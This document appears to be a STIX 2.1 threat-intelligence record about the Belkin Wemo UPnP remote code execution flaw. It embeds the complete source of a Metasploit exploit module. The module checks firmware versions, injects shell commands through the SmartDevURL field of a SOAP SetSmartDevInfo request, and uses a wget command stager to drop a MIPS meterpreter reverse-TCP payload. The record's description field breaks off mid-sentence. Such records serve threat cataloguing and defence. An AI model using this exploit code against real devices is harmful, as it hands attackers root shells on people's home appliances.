{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a7585dac-c108-438b-be69-9c97487a57f4",
    "created": "2024-08-14T16:58:24.519383Z",
    "modified": "2024-08-14T16:58:24.519388Z",
    "name": "Belkin Wemo UPnP Remote Code Execution",
    "description": " This module exploits a command injection in the Belkin Wemo UPnP API via",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/upnp/belkin_wemo_upnp_exec.rb",
            "external_id": "belkin_wemo_upnp_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20150901094849/http://disconnected.io/2014/04/04/universal-plug-and-fuzz/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/phikshun/ufuzz"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/phikshun/10900566"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/phikshun/9984624"
        },
        {
            "source_name": "reference",
            "url": "https://www.crock-pot.com/wemo-landing-page.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.belkin.com/us/support-article?articleNum=101177"
        },
        {
            "source_name": "reference",
            "url": "http://www.wemo.com/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'Belkin Wemo UPnP Remote Code Execution',\n      'Description'        => %q{\n        This module exploits a command injection in the Belkin Wemo UPnP API via\n        the SmartDevURL argument to the SetSmartDevInfo action.\n\n        This module has been tested on a Wemo-enabled Crock-Pot, but other Wemo\n        devices are known to be affected, albeit on a different RPORT (49153).\n      },\n      'Author'             => [\n        'phikshun', # Discovery, UFuzz, and modules\n        'wvu',      # Crock-Pot testing and module\n        'nstarke'   # Version-checking research and implementation\n      ],\n      'References'         => [\n        ['URL', 'https://web.archive.org/web/20150901094849/http://disconnected.io/2014/04/04/universal-plug-and-fuzz/'],\n        ['URL', 'https://github.com/phikshun/ufuzz'],\n        ['URL', 'https://gist.github.com/phikshun/10900566'],\n        ['URL', 'https://gist.github.com/phikshun/9984624'],\n        ['URL', 'https://www.crock-pot.com/wemo-landing-page.html'],\n        ['URL', 'https://www.belkin.com/us/support-article?articleNum=101177'],\n        ['URL', 'http://www.wemo.com/']\n      ],\n      'DisclosureDate'     => '2014-04-04',\n      'License'            => MSF_LICENSE,\n      'Platform'           => ['unix', 'linux'],\n      'Arch'               => [ARCH_CMD, ARCH_MIPSLE],\n      'Privileged'         => true,\n      'Targets'            => [\n        ['Unix In-Memory',\n          'Platform'       => 'unix',\n          'Arch'           => ARCH_CMD,\n          'Type'           => :unix_memory,\n          'DefaultOptions' => {\n            'PAYLOAD'      => 'cmd/unix/generic'\n          }\n        ],\n        ['Linux Dropper',\n          'Platform'       => 'linux',\n          'Arch'           => ARCH_MIPSLE,\n          'Type'           => :linux_dropper,\n          'DefaultOptions' => {\n            'PAYLOAD'      => 'linux/mipsle/meterpreter_reverse_tcp'\n          }\n        ]\n      ],\n      'DefaultTarget'      => 1,\n      'Notes'              => {\n        'NOCVE'            => ['Patched in 2.00.8643 without vendor disclosure'],\n        'Stability'        => [CRASH_SAFE],\n        'SideEffects'      => [ARTIFACTS_ON_DISK],\n        'Reliability'      => [REPEATABLE_SESSION]\n      }\n    ))\n\n    register_options([\n      Opt::RPORT(49152)\n    ])\n\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])\n    ])\n  end\n\n  def check\n    checkcode = CheckCode::Unknown\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/setup.xml'\n    )\n\n    unless res && res.code == 200 && res.body.include?('urn:Belkin:device:')\n      vprint_error('Wemo-enabled device not detected')\n      return checkcode\n    end\n\n    vprint_good('Wemo-enabled device detected')\n    checkcode = CheckCode::Detected\n\n    version = (v = res.get_xml_document.at('firmwareVersion')&.text) &&\n              v =~ /WeMo_WW_(\\d+(?:\\.\\d+)+)/ && $1 && Rex::Version.new($1)\n\n    unless version\n      vprint_error('Could not determine firmware version')\n      return checkcode\n    end\n\n    vprint_status(\"Found firmware version: #{version}\")\n\n    # https://www.tripwire.com/state-of-security/featured/my-sector-story-root-shell-on-the-belkin-wemo-switch/\n    if version < Rex::Version.new('2.00.8643')\n      vprint_good(\"Firmware version #{version} < 2.00.8643\")\n      checkcode = CheckCode::Appears\n    else\n      vprint_error(\"Firmware version #{version} >= 2.00.8643\")\n      checkcode = CheckCode::Safe\n    end\n\n    checkcode\n  end\n\n  def exploit\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      cmdstager = generate_cmdstager(\n        flavor:   :wget,\n        temp:     datastore['WritableDir'],\n        file:     File.basename(cmdstager_path),\n        noconcat: true\n      )\n\n      # HACK: \"chmod +x\"\n      cmdstager.unshift(\"cp /bin/sh #{cmdstager_path}\")\n      cmdstager.delete_if { |cmd| cmd.start_with?('chmod +x') }\n      cmdstager = cmdstager.join(';')\n\n      vprint_status(\"Regenerated command stager: #{cmdstager}\")\n      execute_command(cmdstager)\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    send_request_cgi(\n      'method'       => 'POST',\n      'uri'          => '/upnp/control/basicevent1',\n      'ctype'        => 'text/xml',\n      'headers'      => {\n        'SOAPACTION' => '\"urn:Belkin:service:basicevent:1#SetSmartDevInfo\"'\n      },\n      'data'         => generate_soap_xml(cmd)\n    )\n  end\n\n  def generate_soap_xml(cmd)\n    <<~EOF\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n        <s:Body>\n          <u:SetSmartDevInfo xmlns:u=\"urn:Belkin:service:basicevent:1\">\n            <SmartDevURL>$(#{cmd.encode(xml: :text)})</SmartDevURL>\n          </u:SetSmartDevInfo>\n        </s:Body>\n      </s:Envelope>\n    EOF\n  end\n\n  def cmdstager_path\n    @cmdstager_path ||=\n      \"#{datastore['WritableDir']}/#{rand_text_alphanumeric(8..42)}\"\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-04-04",
    "x_mitre_platforms": [
        "linux'"
    ]
}